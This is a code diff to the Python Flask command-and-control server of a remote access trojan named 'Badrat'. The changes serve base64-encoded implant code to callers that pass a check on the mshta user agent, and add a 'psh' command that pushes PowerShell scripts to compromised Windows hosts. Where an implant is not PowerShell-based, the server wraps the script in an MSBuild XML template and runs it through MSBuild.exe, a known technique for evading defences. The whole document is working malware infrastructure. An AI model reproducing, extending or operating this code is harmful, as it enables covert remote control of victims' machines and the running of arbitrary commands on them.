@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from flask import Flask, request
 from datetime import datetime
+from pathlib import Path
 import threading
 import argparse
 import readline
@@ -25,6 +26,7 @@ port = args.port
 ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
+msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
 
 # I should probably make a dict of dicts...
 commands = {}
@@ -68,8 +70,8 @@ def colors(value):
         return(BOLD + "ALL RATS" + ENDC)
     elif(value == ">>"):
         return( BOLD + c + ">" + js + ">" + ENDC)
-    elif(value == "commit Seppuku"):
-        return(c + value + ENDC)
+    elif(value == "quit"):
+        return(c + "commit Seppuku" + ENDC)
     elif(value == "HTTP" or value == "HTTPS"):
         return(BOLD + value + ENDC)
     try:
@@ -82,7 +84,11 @@ def colors(value):
         else:
             return(BOLD + py + value + ENDC)
     except:
-        return(UNDERLINE + value + ENDC)
+        if(len(value) > 100):
+            return(UNDERLINE + value[0:96] + ENDC + "...")
+        else:
+            return(UNDERLINE + value + ENDC)
+
 
 # Page sent to "unauthorized" users of the http listener
 def default_page():
@@ -90,18 +96,27 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-def send_ratcode(ratID="", ratType=""):
-    if(ratType):
-        with open(os.getcwd() + "/rats/badrat." + ratType, 'r') as fd:
-            if(ratID):
-                print("\n[*] sending " + colors(ratType) + " ratcode to " + colors(ratID))
-            else:
-                print("\n[*] sending ratcode to " + colors(ratType) + " rat")
-            return(fd.read())
-    elif(ratID):
-        with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
-            print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
-            return(fd.read())
+def send_ratcode(ratID):
+    print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
+    with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
+        ratcode = fd.read()
+        if(types[ratID] == "hta"):
+            return(ratcode)
+        else:
+            ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
+            return(ratcode)
+
+def get_psscript(filepath):
+   with open(Path(filepath).resolve() , "r") as fd:
+       content = fd.read()
+       content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+       return(content)
+
+def send_msbuild_xml(script):
+    with open(os.getcwd() + "/resources/nps_minified.xml" , "r") as fd:
+        data = fd.read().replace("~~REPLACE~~" , script)
+        data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
+        return data
 
 def serve_server(port=8080):
     app = Flask(__name__)
@@ -114,9 +129,10 @@ def serve_server(port=8080):
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
         user_agent = request.headers['User-Agent']
-        # Path must be /r/b.hta AND user agent belongs to mshta.exe
-        if(path == "r/b.hta" and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
-            return(send_ratcode(ratType="hta"))
+        # Path must be /<ratID>/r/b.hta AND user agent belongs to mshta.exe
+        if("/r/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent and path.split("/")[0] in rats.keys()):
+            ratID = path.split("/")[0]
+            return(send_ratcode(ratID))
         else:
             print("[!] GET request from non-rat client requested path /" + path)
             return(default_page())
@@ -150,13 +166,8 @@ def serve_server(port=8080):
 
         if("retval" in post_dict.keys()):
             commands[ratID] = ""
-            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + "\n")
+            print("\n[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
-
-        # Spawn from HTTP page
-        if("req" in post_dict.keys() and str.startswith(post_dict['req'], "spawn ")):
-            spawnType =  post_dict['req'].split(" ")[1]
-            return(send_ratcode(ratID=ratID,ratType=spawnType))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
@@ -211,6 +222,7 @@ def get_help():
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new process.")
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
+    print("psh <local_powershell_script_path> -- Runs the powershell script on the rat")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -230,7 +242,7 @@ if __name__ == "__main__":
         print("\n[!] Could not start listener!")
         sys.exit()
 
-    # Main menu
+    # Badrat main menu loop
     while True:
         inp = input(UNDERLINE + "Badrat" + ENDC + " //> ")
 
@@ -261,23 +273,45 @@ if __name__ == "__main__":
         # Enter rat specific command prompt
         elif(inp in rats.keys() or inp == "all"):
             ratID = inp
+
+            # Interact-with-rat loop
             while True:
                 inp = input(colors(ratID) + " \\\\> ")
-                if(inp == "back" or inp == "exit"):
-                    break
-                elif(inp == "agents" or inp == "rats" or inp == "checkins" or inp == "sessions"):
-                    get_rats(ratID)
-                elif(inp == "clear"):
-                    os.system("clear")
-                elif(inp):
-                    if(inp == "quit" or inp == "kill_rat"):
-                        print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
-                        inp = "quit"
-                    else:
-                        print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
 
+                if(inp != ""):
+
+                    if(inp == "back" or inp == "exit"):
+                        break
+
+                    elif(inp == "agents" or inp == "rats" or inp == "implantss" or inp == "sessions"):
+                        get_rats(ratID)
+                        continue
+
+                    elif(inp == "clear"):
+                        os.system("clear")
+
+                    elif(inp == "quit" or inp == "kill_rat"):
+                        inp = "quit"
+
+                    elif(inp == "spawn"):
+                        if(types[ratID] == "ps1"):
+                            inp = "spawn " + send_ratcode(ratID)
+
+                    elif(str.startswith(inp, "psh ")):
+                        try:
+                            filepath = inp.split(" ")[1]
+                            if(types[ratID] == "ps1"):
+                                inp = "psh " + get_psscript(filepath)
+                            else:
+                                inp = "psh " + msbuild_path + " " + send_msbuild_xml(get_psscript(filepath))
+                        except:
+                            print("[!] Could not open file " + filepath + " for reading")
+                            continue
+
+
+                    print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
-                        # update ALL commands
+                    # update ALL commands
                         for i in commands.keys():
                             commands[i] = inp
                     else:
